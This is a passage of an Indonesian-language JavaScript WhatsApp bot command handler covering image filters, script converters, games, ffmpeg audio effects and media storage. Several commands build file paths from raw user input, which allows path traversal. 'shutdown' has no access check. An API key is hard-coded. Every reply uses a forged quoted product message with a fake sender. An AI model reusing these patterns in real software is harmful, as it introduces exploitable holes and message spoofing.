	  Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'grayscale':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(11)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/grayscale?apikey=${LoLKey}&img=${anu.display_url}`)
	  Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'imageflip':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(11)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/flip?apikey=${LoLKey}&img=${anu.display_url}`)
	  Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'pixelate':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(10)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/pixelate?apikey=${LoLKey}&img=${anu.display_url}`)
	  Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'imagerotate':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(13)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/rotate?apikey=${LoLKey}&img=${anu.display_url}`)
	  Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
		case 'profile':
    				Angga.updatePresence(from, Presence.composing)
    				try {
					profil = await Angga.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
					} catch {
					profil = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
					}
					 profile = `╭─「 *_PROFILE* 」\n│• *Nama:* ${pushname}\n│• *User:* √\n│• *Link:* wa.me/${sender.split("@")[0]}\n╰────────────────`
					buff = await getBuffer(profil)
					Angga.sendMessage(from, buff, image, {quoted: mek, caption: profile})
					break
		case 'latinkejawa': 
				if (!isRegistered) return reply(ind.noregis())
				if (args.length < 1) return reply(`Contoh: Makan`)
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/aksara/latinkejawa?text=${gatauda}&APIKEY=${XteamKey}`)
					reply(anu.message)
					break
		case 'afk':
                    alasan = args.join(" ")
                    afk[sender.split('@')[0]] = alasan.toLowerCase()
                    fs.writeFileSync("./database/afk.json", JSON.stringify(afk))
		try {
pp_user = await Angga.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
} catch {
pp_user = 'https://i.ibb.co/Gp4H47k/7dba54f7e250.jpg'
}
pp_riu = await getBuffer(pp_user)
                    ini_txt = "Anda telah afk. "
                    if (alasan != "") {
                        ini_txt += "Dengan alasan " + alasan
                    }
                    Angga.sendMessage(from, pp_riu, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: ini_txt })
                    break
		    case 'jawakelatin': 
				if (!isRegistered) return reply(ind.noregis())
				if (args.length < 1) return reply(`Contoh: ꦲꦭꦺꦴ`)
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/aksara/jawakelatin?text=${gatauda}&APIKEY=${XteamKey}`)
					reply(anu.message)
					break
		    case 'latinkesunda': 
				if (!isRegistered) return reply(ind.noregis())
				if (args.length < 1) return reply(`Contoh: Makan`)
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/aksara/latinkesunda?text=${gatauda}&APIKEY=${XteamKey}`)
					reply(anu.message)
					break
			 case 'sundakelatin': 
				if (!isRegistered) return reply(ind.noregis())
				if (args.length < 1) return reply(`Contoh: Awas ada sunda`)
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/aksara/sundakelatin?text=${gatauda}&APIKEY=${XteamKey}`)
					reply(anu.message)
					break
		case 'xox':
		const exo = [
		'X : X : O',
		'O : X : O',
		'X : O : O',
		'O : X : X',
		'O : X : O',
		'X : O : O',
	        'X : X : O',
		'X : X : X',
		'O : O : O',
		]
            const boxo = exo[Math.floor(Math.random() * exo.length)]
	riucuy = `[  🎰 | X O X ]\n-------------------------\n\n ${boxo}\n\n-------------------------\nKeterangan : Jika anda Mendapatkan Huruf X 3 Huruf Berarti Anda Menang\n*Contoh : X : X : X*`
            reply(riucuy)
	            break
		case 'sewa': 
		case 'sewabot':
                 if (!isRegistered) return reply( ind.noregis())
		    ow = "6285283427860@s.whatsapp.net"
                    sewasu = `
*OPEN JASA SEWA BOT*

Sewa Seminggu : 10k
Sewa Sebulan : 35k

*Payment :*
_Indosat Dan Tsel_

Minat?PM Yg Dibawah
wa.me/6285283427860` 
try {
pp_user = await Angga.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
} catch {
pp_user = 'https://i.ibb.co/Gp4H47k/7dba54f7e250.jpg'
}
pp_riu = await getBuffer(pp_user)
                    Angga.sendMessage(from, pp_riu, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [ow]}, caption: sewasu })
					break
		case 'suit2':
		query = args.join(" ")
		const botol = ['Batu','Gunting','Kertas']
            const suitcuy = botol[Math.floor(Math.random() * botol.length)]
	brow = `
*BOT*
> ${suitcuy}
*KAMU*
> ${query}
`
            reply(brow)
	            break
				case 'shutdown':
                Angga.sendMessage(from, `Oke Desu~`, text,{quoted : mek, contextInfo: { forwardingScore: 1, isForwarded: true}})
                await sleep(5000)
		return Angga.sendMessage(from, JSON.stringify(eval(process.exit())), text, {quoted: mek})
				break
			case 'slot2':
		const sotoy = [
		'🍊 : 🍒 : 🍐',
		'🍒 : 🔔 : 🍊',
		'🍇 : 🍇 : 🍇',
		'🍊 : 🍋 : 🔔',
		'🔔 : 🍒 : 🍐',
		'🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',		
		'🍐 : 🍒 : 🍋',
		'🍐 : 🍐 : 🍐',
		'🍊 : 🍒 : 🍒',
		'🔔 : 🔔 : 🍇',
		'🍌 : 🍒 : 🔔',
		'🍐 : 🔔 : 🔔',
		'🍊 : 🍋 : 🍒',
		'🍋 : 🍋 : 🍌',
		'🔔 : 🔔 : 🍇',
		'🔔 : 🍐 : 🍇',
		'🔔 : 🔔 : 🔔',
		'🍒 : 🍒 : 🍒',
		'🍌 : 🍌 : 🍌'
		]
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
	yow = `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy}<=====\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nKeterangan : Jika anda Mendapatkan 3Buah Sama Berarti Kamu Win\n\nContoh : 🍌 : 🍌 : 🍌<=====`
            reply(yow)
	            break
			case 'slot':
		      if (!isRegistered) return reply(ind.noregis())
		      if (isBanned) return reply(ind.baned())
			if (isLimit(sender)) return reply(ind.limitend(pusname))
                    result = await fetchJson(`https://api.xteam.xyz/game/virtualslot?APIKEY=${XteamKey}`)
                        txt = `*🎰Slot didapatkan🎰* \n\n${result.map}\n`
                        txt += `\n🔖Hasil : ${result.hasil}\n`
                        txt += `🕹️Score : ${result.score}\n`
                        reply(txt)
                        break
				case 'suit':
		if (!isRegistered) return reply(ind.noregis())
		        query = args.join(" ")
                    get_result = await fetchJson(`https://api.xteam.xyz/game/suit?q=${query}&APIKEY=${XteamKey}`)
                    bre = `
*[ BOT ]*
_> ${get_result.jawabanbot}_
*[ USER ]*
> ${get_result.jawabanmu}
*[ POIN ]*
_> ${get_result.poin}_
*[ HASIL ]*
_> ${get_result.hasil}_`
                    reply(bre, {quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
                    break
				case 'nightcore':
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Angga.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Angga.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:false, quoted: mek,duration:999999999999})
						fs.unlinkSync(ran)
					   })
				       break
			case 'slow':
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Angga.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Angga.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
				break
				case 'gemuk':
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Angga.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Angga.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
				break
              case 'tupai':
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Angga.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Angga.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
				break
				case 'fast':
				encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				media = await Angga.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${media} -filter:a "atempo=1.63,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
				fs.unlinkSync(media)
				if (err) return reply('Error!')
				uhh = fs.readFileSync(ran)
				Angga.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
				fs.unlinkSync(ran)
				})
				break
				case 'addbadword': 
                    if (!isOwner) return reply(ind.ownerb())
                    if (!isGroupAdmins) return reply(ind.admin())
                    if (args.length < 1) return reply( `Kirim perintah ${prefix}addbadword [kata kasar]. contoh ${prefix}addbadword bego`)
                    const bw = body.slice(12)
                    bad.push(bw)
                    fs.writeFileSync('./database/kelompok/bad.json', JSON.stringify(bad))
                    reply('Success Menambahkan Bad Word!')
                    break
                case 'delbadword': 
                    if (!isOwner) return reply(ind.ownerb())
                    if (!isGroupAdmins) return reply(ind.admin())
                    if (args.length < 1) return reply( `Kirim perintah ${prefix}addbadword [kata kasar]. contoh ${prefix}addbadword bego`)
                    let dbw = body.slice(12)
                    bad.splice(dbw)
                    fs.writeFileSync('./database/kelompok/bad.json', JSON.stringify(bad))
                    reply('Success Menghapus BAD WORD!')
                    break 
                case 'listbadword': 
                    let lbw = `Ini adalah list BAD WORD\nTotal : ${bad.length}\n`
                    for (let i of bad) {
                        lbw += `➸ ${i.replace(bad)}\n`
                    }
                    await reply(lbw)
                    break 
				case 'getsticker':
				case 'gets': 
				
					namastc = body.slice(12)
					result = fs.readFileSync(`./strg/stiker/${namastc}.webp`)
					Angga.sendMessage(from, result, sticker, {quoted :mek})
					break
				case 'stickerlist':
				case 'liststicker': 
				
					teks = '*Sticker List :*\n\n'
					for (let awokwkwk of setiker) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setiker.length}*`
					Angga.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
					break
				case 'addsticker':
				if (!isRegistered) return reply(ind.noregis())
					if (!isQuotedSticker) return reply('Reply stiker nya')
					svst = body.slice(12)
					if (!svst) return reply('Nama sticker nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await Angga.downloadMediaMessage(boij)
					setiker.push(`${svst}`)
					fs.writeFileSync(`./strg/stiker/${svst}.webp`, delb)
					fs.writeFileSync(`./strg/stik.json`, JSON.stringify(setiker))
					Angga.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststicker`, MessageType.text, { quoted: mek })
					break
				case 'addaudio': 
				
					if (!isQuotedAudio) return reply('Reply vnnya blokk!')
					svst = body.slice(7)
					if (!svst) return reply('Nama audionya apa su?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await Angga.downloadMediaMessage(boij)
					audionye.push(`${svst}`)
					fs.writeFileSync(`./strg/audio/${svst}.mp3`, delb)
					fs.writeFileSync('./strg/audio.json', JSON.stringify(audionye))
					Angga.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: mek })
					break
					case 'antidelete': 
				const dataRevoke = JSON.parse(fs.readFileSync('./src/gc-revoked.json'))
				const dataCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked.json'))
				const dataBanCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked-banlist.json'))
				const isRevoke = dataRevoke.includes(from)
				const isCtRevoke = dataCtRevoke.data
				const isBanCtRevoke = dataBanCtRevoke.includes(sender) ? true : false
				const argz = body.split(' ')
				if (argz.length === 1) return Angga.sendMessage(from, `Penggunaan fitur antidelete :\n\n*${prefix}antidelete [aktif/mati]* (Untuk grup)\n*${prefix}antidelete [ctaktif/ctmati]* (untuk semua kontak)\n*${prefix}antidelete banct 628558xxxxxxx* (banlist kontak)`, MessageType.text)
				if (argz[1] == 'aktif') {
					if (isGroup) {
						if (isRevoke) return Angga.sendMessage(from, `Antidelete telah diaktifkan di grup ini sebelumnya!`, MessageType.text)
						dataRevoke.push(from)
						fs.writeFileSync('./src/gc-revoked.json', JSON.stringify(dataRevoke, null, 2))
						Angga.sendMessage(from, `*Succes Enable Antidelete Grup!*`, MessageType.text)
					} else if (!isGroup) {
						Angga.sendMessage(from, `Untuk kontak penggunaan *${prefix}antidelete ctaktif*`, MessageType.text)
					}
				} else if (argz[1] == 'ctaktif') {
					if (!isGroup) {
						if (isCtRevoke) return Angga.sendMessage(from, `Antidelete telah diaktifkan di semua kontak sebelumnya!`, MessageType.text)
						dataCtRevoke.data = true
						fs.writeFileSync('./src/ct-revoked.json', JSON.stringify(dataCtRevoke, null, 2))
						Angga.sendMessage(from, `Antidelete diaktifkan disemua kontak!`, MessageType.text)
					} else if (isGroup) {
						Angga.sendMessage(from, `Untuk grup penggunaan *${prefix}antidelete aktif*`, MessageType.text)
					}
				} else if (argz[1] == 'banct') {
					if (isBanCtRevoke) return Angga.sendMessage(from, `kontak ini telah ada di database banlist!`, MessageType.text)
					if (argz.length === 2 || argz[2].startsWith('0')) return Angga.sendMessage(from, `Masukan nomer diawali dengan 62! contoh 62859289xxxxx`, MessageType.text)
					dataBanCtRevoke.push(argz[2] + '@s.whatsapp.net')
					fs.writeFileSync('./src/ct-revoked-banlist.json', JSON.stringify(dataBanCtRevoke, null, 2))
					Angga.sendMessage(from, `Kontak ${argz[2]} telah dimasukan ke banlist antidelete secara permanen!`, MessageType.text)
				} else if (argz[1] == 'mati') {
					if (isGroup) {
						const index = dataRevoke.indexOf(from)
						dataRevoke.splice(index, 1)
						fs.writeFileSync('./src/gc-revoked.json', JSON.stringify(dataRevoke, null, 2))
						Angga.sendMessage(from, `*Succes disable Antidelete Grup!*`, MessageType.text)
					} else if (!isGroup) {
						Angga.sendMessage(from, `Untuk kontak penggunaan *${prefix}antidelete ctmati*`, MessageType.text)
					}
				} else if (argz[1] == 'ctmati') {
					if (!isGroup) {
						dataCtRevoke.data = false
						fs.writeFileSync('./src/ct-revoked.json', JSON.stringify(dataCtRevoke, null, 2))
						Angga.sendMessage(from, `Antidelete dimatikan disemua kontak!`, MessageType.text)
					} else if (isGroup) {
						Angga.sendMessage(from, `Untuk grup penggunaan *${prefix}antidelete mati*`, MessageType.text)
					}
				}
				break
				case 'getaudio': 
				
					namastc = body.slice(7) 
					buffer = fs.readFileSync(`./strg/audio/${namastc}.mp3`)
					Angga.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: mek, ptt: true })
					break
				case 'listaudio':
				case 'audiolist': 
				
					teks = '*List Vn:*\n\n'
					for (let awokwkwk of audionye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${audionye.length}*`
					Angga.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": audionye } })
					break
				case 'addimage': 
				
					if (!isQuotedImage) return reply('Reply imagenya blokk!')
					svst = body.slice(10)
					if (!svst) return reply('Nama imagenya apa su?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await Angga.downloadMediaMessage(boij)
					imagenye.push(`${svst}`)
					fs.writeFileSync(`./strg/image/${svst}.jpeg`, delb)
					fs.writeFileSync('./strg/image.json', JSON.stringify(imagenye))
					Angga.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listimage`, MessageType.text, { quoted: mek })
					break
				case 'getimage': 
				
					namastc = body.slice(10)
					buffer = fs.readFileSync(`./strg/image/${namastc}.jpeg`)
					Angga.sendMessage(from, buffer, image, { quoted: mek, caption: `Result From Database : ${namastc}.jpeg` })
					break
				case 'imagelist':
				case 'listimage': 
				
					teks = '*List Image :*\n\n'
					for (let awokwkwk of imagenye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagenye.length}*`
					Angga.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagenye } })
					break
				case 'addvideo': 
				
					if (!isQuotedVideo) return reply('Reply videonya blokk!')
					svst = body.slice(10)
					if (!svst) return reply('Nama videonya apa su?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await Angga.downloadMediaMessage(boij)
					videonye.push(`${svst}`)
					fs.writeFileSync(`./strg/video/${svst}.mp4`, delb)
					fs.writeFileSync('./strg/video.json', JSON.stringify(videonye))
					Angga.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: mek })
					break
					case 'joke':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(6)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/joke?url=${anu.display_url}&apikey=${apileys}`)
	 Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'sepia':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/sepia?url=${anu.display_url}&apikey=${apileys}`)
	 Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'alien':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/alien?apikey=${LoLKey}&img=${anu.display_url}`)
	 Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'removebg':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(10)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/removebg?apikey=${LoLKey}&img=${anu.display_url}`)
